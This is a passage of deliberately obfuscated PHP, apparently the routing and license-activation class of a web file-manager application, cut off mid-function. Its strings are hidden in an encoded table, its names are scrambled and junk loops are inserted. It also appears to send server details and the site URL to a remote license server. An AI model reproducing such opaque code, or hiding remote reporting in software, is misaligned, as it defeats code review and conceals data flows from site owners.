$_SERVER[µª„ÑÊÛ] = explode($_SERVER[”ú…±Ú¥][645], gzinflate(substr($_SERVER[”ú…±Ú¥][646], 10, -8))); $fpknmtqayc = $_SERVER[”ú…±Ú¥][647]; class Application { private $defaultModule = "\x69\156\x64\145\x78"; private $defaultController = "\x69\156\x64\x65\x78"; private $defaultAction = "\151\156\144\x65\x78"; function __construct() { } public function setDefault($€ô• “¶) { $îÒ÷™ÍÅ =& $_SERVER[”ú…±Ú¥]; $£›Î‚ê =& $_SERVER[µª„ÑÊÛ]; $¢Ô¢Á˜’ = explode($£›Î‚ê[0], trim($€ô• “¶, $£›Î‚ê[0])); $‘ù¸™…É = $îÒ÷™ÍÅ[648]; if (strlen($‘ù¸™…É) < $îÒ÷™ÍÅ[192]) { die; } $this->defaultModule = $¢Ô¢Á˜’[0] ? $¢Ô¢Á˜’[0] : $this->defaultModule; $ëÛÖôØè = $îÒ÷™ÍÅ[649]; if (!$ëÛÖôØè) { die; } $this->defaultController = $¢Ô¢Á˜’[1] ? $¢Ô¢Á˜’[1] : $this->defaultController; $this->defaultAction = $¢Ô¢Á˜’[2] ? $¢Ô¢Á˜’[2] : $this->defaultAction; $¹«şÉÙ’ = $îÒ÷™ÍÅ[650]; while (strlen($¹«şÉÙ’) < $îÒ÷™ÍÅ[192]) { if (!$¹«şÉÙ’) { break; } $¹«şÉÙ’++; } $this->zshd44037ad4($£›Î‚ê[1], array($this, $£›Î‚ê[2])); } public function appRun($Æí‹ùÔô) { $•¥ÆÊ†ª =& $_SERVER[”ú…±Ú¥]; $›Á„±‡º =& $_SERVER[µª„ÑÊÛ]; $÷ÜÔÉ²Å = explode($›Á„±‡º[0], $Æí‹ùÔô); $‰— – = $•¥ÆÊ†ª[651]; $©Ë‰š“ö = strtolower($÷ÜÔÉ²Å[0]); $Ù”ë£û = $›Á„±‡º[3]; if ($©Ë‰š“ö == $›Á„±‡º[4]) { $Ù”ë£û = $›Á„±‡º[5]; $÷ÜÔÉ²Å[0] = $›Á„±‡º[6]; $÷ÜÔÉ²Å[1] = $÷ÜÔÉ²Å[1] . $›Á„±‡º[7]; $Æí‹ùÔô = join($›Á„±‡º[0], $÷ÜÔÉ²Å); $Æí‹ùÔô = trim($Æí‹ùÔô, $›Á„±‡º[0]); } call_user_func(array($›Á„±‡º[8], $›Á„±‡º[9]), $Ù”ë£û . $›Á„±‡º[10], $Æí‹ùÔô); ActionCall($Æí‹ùÔô); call_user_func(array($›Á„±‡º[8], $›Á„±‡º[9]), $Ù”ë£û . $›Á„±‡º[11], $Æí‹ùÔô); $®â¬õ‚ = $•¥ÆÊ†ª[652]; while (strlen($®â¬õ‚) < $•¥ÆÊ†ª[653]) { if (!$®â¬õ‚) { break; } $®â¬õ‚++; } } private function autorun() { $ïÇßÙ¾ =& $_SERVER[µª„ÑÊÛ]; global $config; if (count($config[$ïÇßÙ¾[12]]) == 0) { return; } foreach ($config[$ïÇßÙ¾[12]] as $Û¬”İË => $êÕÕ¥Ç©) { $this->appRun($êÕÕ¥Ç©); } } private function lcgh60035c27() { $«Ğ¾ô— =& $_SERVER[”ú…±Ú¥]; $¦¡°†ç =& $_SERVER[µª„ÑÊÛ]; $Îìş—²Š = $¦¡°†ç[4]; $­Œê•®‡ = $GLOBALS[$¦¡°†ç[13]][$¦¡°†ç[14]][0]; $Û‰†›µ… = $«Ğ¾ô—[654]; if (!$Û‰†›µ…) { return; } if (!$­Œê•®‡ || strlen($­Œê•®‡) <= strlen($Îìş—²Š)) { return; } if (strtolower(substr($­Œê•®‡, -strlen($Îìş—²Š))) != $Îìş—²Š) { return; } $ñ˜íÓ = substr($­Œê•®‡, 0, -strlen($Îìş—²Š)); $İ—ìÙ• = array($¦¡°†ç[4], $ñ˜íÓ); $Ä°Á¼» = array_slice($GLOBALS[$¦¡°†ç[13]][$¦¡°†ç[14]], 1); $ÉÅâã = $«Ğ¾ô—[655]; while ($ÉÅâã < $«Ğ¾ô—[656]) { if ($ÉÅâã >= 0) { break; } $ÉÅâã++; } $GLOBALS[$¦¡°†ç[13]][$¦¡°†ç[14]] = array_merge($İ—ìÙ•, $Ä°Á¼»); $œŒÙ¬‹İ = $«Ğ¾ô—[657]; while ($œŒÙ¬‹İ < $«Ğ¾ô—[653]) { if ($œŒÙ¬‹İ >= 0) { break; } $œŒÙ¬‹İ++; } $GLOBALS[$¦¡°†ç[13]][$¦¡°†ç[15]] = implode($¦¡°†ç[0], $GLOBALS[$¦¡°†ç[13]][$¦¡°†ç[14]]); } private function yfup872ec4ae() { $Äğ£ÓÇ” =& $_SERVER[”ú…±Ú¥]; $ùšªÀòÀ =& $_SERVER[µª„ÑÊÛ]; if ($GLOBALS[$ùšªÀòÀ[13]][$ùšªÀòÀ[15]] != $ùšªÀòÀ[6]) { return; } $İÁõ’•§ = $_SERVER[$ùšªÀòÀ[16]]; $Ğ¥’™ˆí = $ùšªÀòÀ[17]; $æ¼¶Ğª× = $Äğ£ÓÇ”[658]; if (!$æ¼¶Ğª×) { return; } if (!strstr($İÁõ’•§, $Ğ¥’™ˆí)) { return; } $„ü˜€“ = strrpos($İÁõ’•§, $Ğ¥’™ˆí); $ç¿òá‰Å = $Äğ£ÓÇ”[659]; if (!$ç¿òá‰Å) { die; } $¦•÷è = substr($İÁõ’•§, $„ü˜€“ + strlen($Ğ¥’™ˆí)); $Ÿ‚ıìÕ¾ = $Äğ£ÓÇ”[660]; preg_match_all($ùšªÀòÀ[18], $¦•÷è, $¼ƒƒÀ¿ğ); $¦•÷è = trim($¼ƒƒÀ¿ğ[0][0], $ùšªÀòÀ[19]); $ù•»¡ê = $Äğ£ÓÇ”[661]; while (strlen($ù•»¡ê) < $Äğ£ÓÇ”[656]) { if (!$ù•»¡ê) { break; } $ù•»¡ê++; } $GLOBALS[$ùšªÀòÀ[13]][$ùšªÀòÀ[14]] = explode($ùšªÀòÀ[19], $¦•÷è); $GLOBALS[$ùšªÀòÀ[13]][$ùšªÀòÀ[15]] = implode($ùšªÀòÀ[0], $GLOBALS[$ùšªÀòÀ[13]][$ùšªÀòÀ[14]]); $Æ³‰á±‡ = $Äğ£ÓÇ”[662]; if (!$Æ³‰á±‡) { die; } } public function run() { $¨à‹Ô® =& $_SERVER[”ú…±Ú¥]; $¯¬‡åï =& $_SERVER[µª„ÑÊÛ]; $this->yfup872ec4ae(); $Ç¿¿š = $¨à‹Ô®[663]; if (!$Ç¿¿š) { return; } $this->lcgh60035c27(); $Ğ‰âÊ¨ò = $GLOBALS[$¯¬‡åï[13]][$¯¬‡åï[14]]; $Ã‘şŒ¢ = $GLOBALS[$¯¬‡åï[13]][$¯¬‡åï[15]]; define($¯¬‡åï[20], isset($Ğ‰âÊ¨ò[0]) && $Ğ‰âÊ¨ò[0] ? $Ğ‰âÊ¨ò[0] : $this->defaultModule); $ñ²ñØœ = $¨à‹Ô®[664]; while (strlen($ñ²ñØœ) < $¨à‹Ô®[665]) { if (!$ñ²ñØœ) { break; } $ñ²ñØœ++; } define($¯¬‡åï[21], isset($Ğ‰âÊ¨ò[1]) && $Ğ‰âÊ¨ò[0] ? $Ğ‰âÊ¨ò[1] : $this->defaultController); $£µ¤ÜçÖ = $¨à‹Ô®[666]; define($¯¬‡åï[22], isset($Ğ‰âÊ¨ò[2]) && $Ğ‰âÊ¨ò[0] ? $Ğ‰âÊ¨ò[2] : $this->defaultAction); $ºí¤Î’ê = $¨à‹Ô®[667]; if (strlen($ºí¤Î’ê) < $¨à‹Ô®[653]) { die; } define($¯¬‡åï[23], MOD . $¯¬‡åï[0] . ST . $¯¬‡åï[0] . ACT); $_SERVER[$¯¬‡åï[24]] = strtolower(ACTION); $this->autorun(); $Á†¾»¤ö = $¨à‹Ô®[668]; while ($Á†¾»¤ö < $¨à‹Ô®[656]) { if ($Á†¾»¤ö >= 0) { break; } $Á†¾»¤ö++; } if (count($Ğ‰âÊ¨ò) >= 3) { $this->appRun($Ã‘şŒ¢); } else { $this->appRun(ACTION); } } private $gtui34935948 = array(); private $wmcv07989cfa = ''; public function zusjc810e416() { $‹ÔÚ­ƒ =& $_SERVER[”ú…±Ú¥]; $À”Õæ±Ú =& $_SERVER[µª„ÑÊÛ]; $this->fdvtbd101fdb(); $this->rinu223aa83c(); $ıÆìÌóá = $‹ÔÚ­ƒ[669]; while ($ıÆìÌóá < $‹ÔÚ­ƒ[665]) { if ($ıÆìÌóá >= 0) { break; } $ıÆìÌóá++; } $this->mugx5d76dbb9(); $Ÿ€‡õè« = $‹ÔÚ­ƒ[670]; if (strlen($Ÿ€‡õè«) < $‹ÔÚ­ƒ[671]) { die; } $this->lnzb055c6277(); $ç«£¨† = $‹ÔÚ­ƒ[672]; $this->ljfi180dca65(); $Ö±ÅĞşŒ = $‹ÔÚ­ƒ[673]; while (strlen($Ö±ÅĞşŒ) < $‹ÔÚ­ƒ[671]) { if (!$Ö±ÅĞşŒ) { break; } $Ö±ÅĞşŒ++; } $this->mrqdaa936ded(); $˜û§âæÆ = $‹ÔÚ­ƒ[674]; while ($˜û§âæÆ < $‹ÔÚ­ƒ[653]) { if ($˜û§âæÆ >= 0) { break; } $˜û§âæÆ++; } $this->mtpscd141bc1(); $âääµØ = $‹ÔÚ­ƒ[675]; if (strlen($âääµØ) < $‹ÔÚ­ƒ[653]) { return; } $this->zshd44037ad4($À”Õæ±Ú[25], array($this, $À”Õæ±Ú[26])); $®¿«èÁ‡ = $‹ÔÚ­ƒ[676]; $this->zshd44037ad4($À”Õæ±Ú[27], array($this, $À”Õæ±Ú[28])); $this->zshd44037ad4($À”Õæ±Ú[29], array($this, $À”Õæ±Ú[30])); $this->zshd44037ad4($À”Õæ±Ú[31], array($this, $À”Õæ±Ú[32])); } public function lsnz7bbbfda6($¬ÙÊû´¨) { $‡œùã ˆ =& $_SERVER[”ú…±Ú¥]; $ÇŸˆ¦šÇ =& $_SERVER[µª„ÑÊÛ]; $İÜ»áó¦ = Model($ÇŸˆ¦šÇ[33])->get(); $íƒÊ«Äò = $‡œùã ˆ[677]; if (strlen($íƒÊ«Äò) < $‡œùã ˆ[192]) { return; } $²‹–ŠÄ‘ = array($ÇŸˆ¦šÇ[34], $ÇŸˆ¦šÇ[35], $ÇŸˆ¦šÇ[36], $ÇŸˆ¦šÇ[37], $ÇŸˆ¦šÇ[38], $ÇŸˆ¦šÇ[39], $ÇŸˆ¦šÇ[40], $ÇŸˆ¦šÇ[41], $ÇŸˆ¦šÇ[42], $ÇŸˆ¦šÇ[43], $ÇŸˆ¦šÇ[44], $ÇŸˆ¦šÇ[45], $ÇŸˆ¦šÇ[46], $ÇŸˆ¦šÇ[47], $ÇŸˆ¦šÇ[48], $ÇŸˆ¦šÇ[49], $ÇŸˆ¦šÇ[50], $ÇŸˆ¦šÇ[51], $ÇŸˆ¦šÇ[52], $ÇŸˆ¦šÇ[53], $ÇŸˆ¦šÇ[54], $ÇŸˆ¦šÇ[55], $ÇŸˆ¦šÇ[56], $ÇŸˆ¦šÇ[57], $ÇŸˆ¦šÇ[58], $ÇŸˆ¦šÇ[59], $ÇŸˆ¦šÇ[60], $ÇŸˆ¦šÇ[61], $ÇŸˆ¦šÇ[62], $ÇŸˆ¦šÇ[63], $ÇŸˆ¦šÇ[64], $ÇŸˆ¦šÇ[65], $ÇŸˆ¦šÇ[66], $ÇŸˆ¦šÇ[67], $ÇŸˆ¦šÇ[68], $ÇŸˆ¦šÇ[69], $ÇŸˆ¦šÇ[70], $ÇŸˆ¦šÇ[71], $ÇŸˆ¦šÇ[72], $ÇŸˆ¦šÇ[73], $ÇŸˆ¦šÇ[74], $ÇŸˆ¦šÇ[75], $ÇŸˆ¦šÇ[76], $ÇŸˆ¦šÇ[77], $ÇŸˆ¦šÇ[78], $ÇŸˆ¦šÇ[79], $ÇŸˆ¦šÇ[80], $ÇŸˆ¦šÇ[81], $ÇŸˆ¦šÇ[82], $ÇŸˆ¦šÇ[83], $ÇŸˆ¦šÇ[84]); $ó ’½¹— = $‡œùã ˆ[678]; while (strlen($ó ’½¹—) < $‡œùã ˆ[653]) { if (!$ó ’½¹—) { break; } $ó ’½¹—++; } foreach ($²‹–ŠÄ‘ as $µÍİĞ¬¥) { $Æ‹èÏø® = $GLOBALS[$ÇŸˆ¦šÇ[85]][$ÇŸˆ¦šÇ[86]][$µÍİĞ¬¥]; if (isset($İÜ»áó¦[$µÍİĞ¬¥])) { $Æ‹èÏø® = $İÜ»áó¦[$µÍİĞ¬¥]; } $¬ÙÊû´¨[$ÇŸˆ¦šÇ[87]][$ÇŸˆ¦šÇ[88]][$µÍİĞ¬¥] = $Æ‹èÏø®; } $—äìÄÎ± = $¬ÙÊû´¨[$ÇŸˆ¦šÇ[87]][$ÇŸˆ¦šÇ[88]][$ÇŸˆ¦šÇ[46]]; $§„Ñí­ = $‡œùã ˆ[679]; if (!$§„Ñí­) { die; } unset($¬ÙÊû´¨[$ÇŸˆ¦šÇ[87]][$ÇŸˆ¦šÇ[89]][$ÇŸˆ¦šÇ[90]]); $Üµ„é­ = $‡œùã ˆ[680]; unset($¬ÙÊû´¨[$ÇŸˆ¦šÇ[87]][$ÇŸˆ¦šÇ[89]][$ÇŸˆ¦šÇ[91]]); unset($¬ÙÊû´¨[$ÇŸˆ¦šÇ[87]][$ÇŸˆ¦šÇ[88]][$ÇŸˆ¦šÇ[46]]); unset($¬ÙÊû´¨[$ÇŸˆ¦šÇ[87]][$ÇŸˆ¦šÇ[88]][$ÇŸˆ¦šÇ[92]]); $Ù§œ•àœ = $‡œùã ˆ[681]; if (!$Ù§œ•àœ) { return; } $¬ÙÊû´¨[$ÇŸˆ¦šÇ[87]][$ÇŸˆ¦šÇ[88]][$ÇŸˆ¦šÇ[93]] = array($ÇŸˆ¦šÇ[94] => (int) $—äìÄÎ±[$ÇŸˆ¦šÇ[95]], $ÇŸˆ¦šÇ[96] => (int) _get($—äìÄÎ±, $ÇŸˆ¦šÇ[97], 0)); $ä¾Ñ…Ö‚ = $‡œùã ˆ[682]; if (strlen($ä¾Ñ…Ö‚) < $‡œùã ˆ[656]) { return; } $¬ÙÊû´¨[$ÇŸˆ¦šÇ[98]][$ÇŸˆ¦šÇ[99]] = Action($ÇŸˆ¦šÇ[100])->accessToken(); $¬ÙÊû´¨[$ÇŸˆ¦šÇ[98]][$ÇŸˆ¦šÇ[101]] = md5($_SERVER[$ÇŸˆ¦šÇ[102]] . $İÜ»áó¦[$ÇŸˆ¦šÇ[103]]); $¹÷”µä = $‡œùã ˆ[683]; $¬ÙÊû´¨[$ÇŸˆ¦šÇ[98]][$ÇŸˆ¦šÇ[104]] = base64_encode(serverInfo()); $¬ÙÊû´¨[$ÇŸˆ¦šÇ[98]][$ÇŸˆ¦šÇ[105]] = $this->wmcv07989cfa; $º‡êšÖ = $‡œùã ˆ[684]; if ($İÜ»áó¦[$ÇŸˆ¦šÇ[105]] != $ÇŸˆ¦šÇ[106]) { $¬ÙÊû´¨[$ÇŸˆ¦šÇ[98]][$ÇŸˆ¦šÇ[107]] = $İÜ»áó¦[$ÇŸˆ¦šÇ[107]]; $¬ÙÊû´¨[$ÇŸˆ¦šÇ[98]][$ÇŸˆ¦šÇ[108]] = $İÜ»áó¦[$ÇŸˆ¦šÇ[108]]; $¬ÃÃ„¶Ì = rand_string(10) . $this->wmcv07989cfa . rand_string(5); $¬ÙÊû´¨[$ÇŸˆ¦šÇ[87]][$ÇŸˆ¦šÇ[109]][$ÇŸˆ¦šÇ[110]] = $this->tsmd6a4e7bf7($¬ÃÃ„¶Ì, $¬ÙÊû´¨[$ÇŸˆ¦šÇ[98]][$ÇŸˆ¦šÇ[101]]); } if ($this->wmcv07989cfa == $ÇŸˆ¦šÇ[106]) { $¬ÙÊû´¨[$ÇŸˆ¦šÇ[87]][$ÇŸˆ¦šÇ[88]][$ÇŸˆ¦šÇ[93]][$ÇŸˆ¦šÇ[97]] = 0; } $¬ÙÊû´¨[$ÇŸˆ¦šÇ[98]][$ÇŸˆ¦šÇ[111]] = _get($this->gtui34935948, $ÇŸˆ¦šÇ[112], $ÇŸˆ¦šÇ[6]); $¬ÙÊû´¨[$ÇŸˆ¦šÇ[98]][$ÇŸˆ¦šÇ[113]] = _get($this->gtui34935948, $ÇŸˆ¦šÇ[114], $ÇŸˆ¦šÇ[6]); if (_get($GLOBALS, $ÇŸˆ¦šÇ[115]) && $this->config[$ÇŸˆ¦šÇ[116]]) { $¬ÙÊû´¨[$ÇŸˆ¦šÇ[98]][$ÇŸˆ¦šÇ[117]] = WEB_ROOT; } return $¬ÙÊû´¨; } private function mrqdaa936ded() { $íúğûø‹ =& $_SERVER[”ú…±Ú¥]; $ØùÚ³®¤ =& $_SERVER[µª„ÑÊÛ]; $…½ÃÀ’± = $_SERVER[$ØùÚ³®¤[24]] == $ØùÚ³®¤[118]; $Õıë‘”° = $íúğûø‹[685]; if ($_SERVER[$ØùÚ³®¤[24]] == $ØùÚ³®¤[119] && $_GET[$ØùÚ³®¤[120]] == $ØùÚ³®¤[121]) { $…½ÃÀ’± = !0; } if ($…½ÃÀ’±) { $·Ğ´©Æà = array($ØùÚ³®¤[105] => $this->wmcv07989cfa, $ØùÚ³®¤[122] => $this->lirza643d657(), $ØùÚ³®¤[123] => Model($ØùÚ³®¤[124])->count()); if ($this->wmcv07989cfa != $ØùÚ³®¤[106]) { $ÍàÔ¶» = _get($this->gtui34935948, $ØùÚ³®¤[125]); if ($ÍàÔ¶») { $·Ğ´©Æà[$ØùÚ³®¤[126]] = $ÍàÔ¶»; $·Ğ´©Æà[$ØùÚ³®¤[127]] = strtotime(_get($this->gtui34935948, $ØùÚ³®¤[128])); $·Ğ´©Æà[$ØùÚ³®¤[129]] = _get($this->gtui34935948, $ØùÚ³®¤[114]); } $îÍæ¾è = Model($ØùÚ³®¤[33])->get($ØùÚ³®¤[130], $ØùÚ³®¤[6], !0); if (is_string($îÍæ¾è) && substr($îÍæ¾è, 0, 1) == $ØùÚ³®¤[131]) { $îÍæ¾è = json_decode_force($îÍæ¾è); } if (is_array($îÍæ¾è) && $îÍæ¾è[$ØùÚ³®¤[132]] && strstr($îÍæ¾è[$ØùÚ³®¤[132]], $ØùÚ³®¤[133])) { $š»ıè¹É = explode($ØùÚ³®¤[133], $îÍæ¾è[$ØùÚ³®¤[132]]); $·Ğ´©Æà[$ØùÚ³®¤[134]] = $š»ıè¹É[0]; } } $·Ğ´©Æà = $this->qyxzcaf2f017(json_encode($·Ğ´©Æà), md5($ØùÚ³®¤[135])); $ö°Áøöâ = $íúğûø‹[686]; $èíÊ–şê = array($ØùÚ³®¤[136] => $·Ğ´©Æà); $ä§Õéğ = $íúğûø‹[687]; while (strlen($ä§Õéğ) < $íúğûø‹[671]) { if (!$ä§Õéğ) { break; } $ä§Õéğ++; } call_user_func(array($ØùÚ³®¤[137], $ØùÚ³®¤[138]), $èíÊ–şê); } if ($this->wmcv07989cfa == $ØùÚ³®¤[106]) { return; } $Ú¼Ø—˜‡ = array($ØùÚ³®¤[139], $ØùÚ³®¤[140], $ØùÚ³®¤[141], $ØùÚ³®¤[142], $ØùÚ³®¤[143], $ØùÚ³®¤[144]); $¥ÕÄ¨¸Ú = Model($ØùÚ³®¤[33])->get(); $èíÊ–şê = array($ØùÚ³®¤[145] => $¥ÕÄ¨¸Ú[$ØùÚ³®¤[34]], $ØùÚ³®¤[146] => $¥ÕÄ¨¸Ú[$ØùÚ³®¤[35]], $ØùÚ³®¤[147] => $ØùÚ³®¤[6]); $ÒêØ«ıË = $íúğûø‹[688]; if (strlen($ÒêØ«ıË) < $íúğûø‹[192]) { die; } foreach ($Ú¼Ø—˜‡ as $®ÏŸ×±ï) { if (!isset($¥ÕÄ¨¸Ú[$®ÏŸ×±ï]) || !$¥ÕÄ¨¸Ú[$®ÏŸ×±ï]) { continue; } $èíÊ–şê[$®ÏŸ×±ï] = $¥ÕÄ¨¸Ú[$®ÏŸ×±ï]; $¥‰ñ¡¨â = $íúğûø‹[689]; } call_user_func(array($ØùÚ³®¤[137], $ØùÚ³®¤[138]), $èíÊ–şê); $øëñ¶á© = $íúğûø‹[690]; } private function lnzb055c6277() { $“ÌœØ”« =& $_SERVER[”ú…±Ú¥]; $¥†úĞÂ£ =& $_SERVER[µª„ÑÊÛ]; if ($_SERVER[$¥†úĞÂ£[24]] != $¥†úĞÂ£[148]) { return; } if (!_get($GLOBALS, $¥†úĞÂ£[115])) { die; } $ÏÅõİ¢½ = $GLOBALS[$¥†úĞÂ£[13]]; if (isset($ÏÅõİ¢½[$¥†úĞÂ£[149]])) { $this->ngyj0c536d46(); die; } if (!isset($ÏÅõİ¢½[$¥†úĞÂ£[150]]) || strlen($ÏÅõİ¢½[$¥†úĞÂ£[150]]) != 16) { show_json($¥†úĞÂ£[151] . $ÏÅõİ¢½[$¥†úĞÂ£[150]], !1); } $§İ§‰¦ = Model($¥†úĞÂ£[33])->get($¥†úĞÂ£[103]); $ğéíøÈ = md5($_SERVER[$¥†úĞÂ£[102]] . $§İ§‰¦); $Ç±ï·ÒŠ = $“ÌœØ”«[691]; while ($Ç±ï·ÒŠ < $“ÌœØ”«[671]) { if ($Ç±ï·ÒŠ >= 0) { break; } $Ç±ï·ÒŠ++; } $ö•˜Ñ“  = array($¥†úĞÂ£[150] => $ÏÅõİ¢½[$¥†úĞÂ£[150]], $¥†úĞÂ£[152] => rand_string(16), $¥†úĞÂ£[153] => $¥†úĞÂ£[135], $¥†úĞÂ£[154] => $¥†úĞÂ£[155], $¥†úĞÂ£[156] => $_SERVER[$¥†úĞÂ£[157]], $¥†úĞÂ£[158] => $_SERVER[$¥†úĞÂ£[159]], $¥†úĞÂ£[160] => $_SERVER[$¥†úĞÂ£[161]], $¥†úĞÂ£[101] => $ğéíøÈ, $¥†úĞÂ£[162] => Model($¥†úĞÂ£[33])->get($¥†úĞÂ£[130])); if ($ÏÅõİ¢½[$¥†úĞÂ£[163]] == $¥†úĞÂ£[164]) { $ÅÑÔÄİï = $this->qyxzcaf2f017($ğéíøÈ, $¥†úĞÂ£[165]); $Ìéò¥€¢ = $this->tsmd6a4e7bf7(json_encode($ö•˜Ñ“ ), $ğéíøÈ . $¥†úĞÂ£[166], 3); $Ìéò¥€¢ = $Ìéò¥€¢ . $¥†úĞÂ£[167] . $_SERVER[$¥†úĞÂ£[157]]; $¤³ò© = $this->ktmr56b58342($¥†úĞÂ£[168] . $ÅÑÔÄİï . $¥†úĞÂ£[169] . $Ìéò¥€¢, -1); show_json($¤³ò©, !0); } else { if ($ÏÅõİ¢½[$¥†úĞÂ£[163]] == $¥†úĞÂ£[170]) { $ôŒíĞòÍ = substr(md5($¥†úĞÂ£[171] . $ğéíøÈ), 12, 15) . $¥†úĞÂ£[172]; $Ìéò¥€¢ = $this->vrskd4c8dfbd(trim($ÏÅõİ¢½[$¥†úĞÂ£[173]]), $ôŒíĞòÍ, 2); $ìÄ“ş” = json_decode($Ìéò¥€¢, !0); if (!is_array($ìÄ“ş”) || !is_array($ìÄ“ş”[$¥†úĞÂ£[174]]) || $ìÄ“ş”[$¥†úĞÂ£[150]] != !0) { $Ò®¡”ÄË = $¥†úĞÂ£[175]; $™ªä‚ôÔ = $ìÄ“ş”[$¥†úĞÂ£[174]] ? $¥†úĞÂ£[176] . $ìÄ“ş”[$¥†úĞÂ£[174]] : $Ò®¡”ÄË; show_json($™ªä‚ôÔ, !1); } else { $ö•˜Ñ“ [$¥†úĞÂ£[152]] = $ìÄ“ş”[$¥†úĞÂ£[174]][$¥†úĞÂ£[177]]; } } else { $ìÄ“ş” = $this->ktmr56b58342($¥†úĞÂ£[178], $ö•˜Ñ“ , 10); $øñ³ü•ï = $“ÌœØ”«[692]; } } if (!is_array($ìÄ“ş”) || !is_array($ìÄ“ş”[$¥†úĞÂ£[174]]) || $ìÄ“ş”[$¥†úĞÂ£[150]] != !0) { $Ò®¡”ÄË = LNG($¥†úĞÂ£[179]); $™ªä‚ôÔ = $ìÄ“ş”[$¥†úĞÂ£[174]] ? $¥†úĞÂ£[176] . $ìÄ“ş”[$¥†úĞÂ£[174]] : $Ò®¡”ÄË; show_json($™ªä‚ôÔ, !1); } $™–ËıÒ = $ìÄ“ş”[$¥†úĞÂ£[174]]; $ò¾äûúù = $this->bdpa38ccfca2($™–ËıÒ[$¥†úĞÂ£[180]]); if (!$ò¾äûúù || $ò¾äûúù != $™–ËıÒ[$¥†úĞÂ£[128]]) { $Õ“Òó” = array($¥†úĞÂ£[181] => Model($¥†úĞÂ£[33])->get($¥†úĞÂ£[103]), $¥†úĞÂ£[182] => $_SERVER[$¥†úĞÂ£[102]], $¥†úĞÂ£[183] => this_url(), $¥†úĞÂ£[158] => $_SERVER[$¥†úĞÂ£[159]]); $Ìéò¥€¢ = $this->yveue974d758(json_encode($Õ“Òó”)); $this->ktmr56b58342($¥†úĞÂ£[184] . $Ìéò¥€¢); show_json(LNG($¥†úĞÂ£[185]), !0); } $¥¼šˆ¢õ = array($¥†úĞÂ£[186] => $™–ËıÒ[$¥†úĞÂ£[187]], $¥†úĞÂ£[188] => $™–ËıÒ[$¥†úĞÂ£[189]], $¥†úĞÂ£[190] => rand_string(16), $¥†úĞÂ£[105] => $™–ËıÒ[$¥†úĞÂ£[191]]); if ($ö•˜Ñ“ [$¥†úĞÂ£[152]]) { $¥¼šˆ¢õ[$¥†úĞÂ£[190]] = $ö•˜Ñ“ [$¥†úĞÂ£[152]]; } $×«ÄÒ¦æ = substr(md5($¥¼šˆ¢õ[$¥†úĞÂ£[188]]), 10, 10); $¯õßÎ§§ = $×«ÄÒ¦æ . $¥¼šˆ¢õ[$¥†úĞÂ£[105]] . $¥¼šˆ¢õ[$¥†úĞÂ£[190]]; $¥¼šˆ¢õ[$¥†úĞÂ£[107]] = strrev(base64_encode($this->qyxzcaf2f017($¯õßÎ§§, $¥†úĞÂ£[192]))); $¹†ë½„İ = rand_string(16); $Ï‰ÍÚ¥õ = $¹†ë½„İ . $¥¼šˆ¢õ[$¥†úĞÂ£[105]] . $this->qyxzcaf2f017(md5($¥¼šˆ¢õ[$¥†úĞÂ£[186]]), $¹†ë½„İ); $¨ß—É£ù = $“ÌœØ”«[693]; $¥¼šˆ¢õ[$¥†úĞÂ£[108]] = base64_encode(strrev($this->qyxzcaf2f017($Ï‰ÍÚ¥õ, $¥†úĞÂ£[193]))); $µáœÌâİ = $“ÌœØ”«[694]; if ($™–ËıÒ[$¥†úĞÂ£[194]] && $™–ËıÒ[$¥†úĞÂ£[194]] >= 1) { Model($¥†úĞÂ£[33])->setDeep($¥†úĞÂ£[195], $¥†úĞÂ£[121]); } Model($¥†úĞÂ£[33])->set($¥¼šˆ¢õ); $ş¥îí¬¼ = md5($_SERVER[$¥†úĞÂ£[102]] . strrev($§İ§‰¦) . $¥¼šˆ¢õ[$¥†úĞÂ£[188]]); $ë‰ëìşÀ = $“ÌœØ”«[695]; while ($ë‰ëìşÀ < $“ÌœØ”«[671]) { if ($ë‰ëìşÀ >= 0) { break; } $ë‰ëìşÀ++; } $¥—ê‘¹‘ = strrev(substr($ş¥îí¬¼, 10, 16)); $œè’€éà = $“ÌœØ”«[696]; $ïÜÀª™è = $this->tsmd6a4e7bf7(json_encode($™–ËıÒ), $ş¥îí¬¼); $£ä¼Æ¥ = $“ÌœØ”«[697]; if (strlen($£ä¼Æ¥) < $“ÌœØ”«[671]) { return; } $Èæ±êï = array_to_keyvalue(Model($¥†úĞÂ£[7])->listData(), $¥†úĞÂ£[196]); $‘ú¡úÉş = $Èæ±êï[$¥†úĞÂ£[197]]; $øÃ²Óè· = array(); $öâå“ªå = $“ÌœØ”«[698]; if (strlen($öâå“ªå) < $“ÌœØ”«[671]) { return; } $øÃ²Óè·[$¥—ê‘¹‘] = $ïÜÀª™è; $œË­°· = $“ÌœØ”«[699]; if (!$œË­°·) { die; } Model($¥†úĞÂ£[7])->update($‘ú¡úÉş[$¥†úĞÂ£[198]], array($¥†úĞÂ£[199] => $øÃ²Óè·)); $this->gtui34935948 = $™–ËıÒ; $¨Çùß‹Ï = $“ÌœØ”«[700]; while ($¨Çùß‹Ï < $“ÌœØ”«[653]) { if ($¨Çùß‹Ï >= 0) { break; } $¨Çùß‹Ï++; } $this->wmcv07989cfa = $¥¼šˆ¢õ[$¥†úĞÂ£[105]]; $this->licenseRegistSuccess(); Cache::set($¥†úĞÂ£[200] . md5($§İ§‰¦ . $¥†úĞÂ£[201]), $¥†úĞÂ£[6]); show_json(LNG($¥†úĞÂ£[185]), !0); $“ëÜÈé¢ = $“ÌœØ”«[701]; if (strlen($“ëÜÈé¢) < $“ÌœØ”«[192]) { return; } } private function licenseRegistSuccess() { $ÉÁ£ƒî® =& $_SERVER[µª„ÑÊÛ]; $ØèõÅš = Model($ÉÁ£ƒî®[33])->get(); if ($ØèõÅš[$ÉÁ£ƒî®[63]] != $ÉÁ£ƒî®[121]) { Model($ÉÁ£ƒî®[33])->set($ÉÁ£ƒî®[63], $ÉÁ£ƒî®[121]); } Action($ÉÁ£ƒî®[202])->initStart(!0); } private function ngyj0c536d46() { $òş–ş€‹ =& $_SERVER[µª„ÑÊÛ]; Model($òş–ş€‹[33])->set(array($òş–ş€‹[186] => $òş–ş€‹[6], $òş–ş€‹[188] => $òş–ş€‹[6], $òş–ş€‹[105] => $òş–ş€‹[106], $òş–ş€‹[107] => $òş–ş€‹[6], $òş–ş€‹[108] => $òş–ş€‹[6])); Model($òş–ş€‹[33])->setDeep($òş–ş€‹[195], $òş–ş€‹[203]); $¨‚Éòİ… = $_SERVER[”ú…±Ú¥][702]; $this->gtui34935948 = array(); $this->wmcv07989cfa = $òş–ş€‹[106]; } private function fdvtbd101fdb() { $Á›Úã”ê =& $_SERVER[”ú…±Ú¥]; 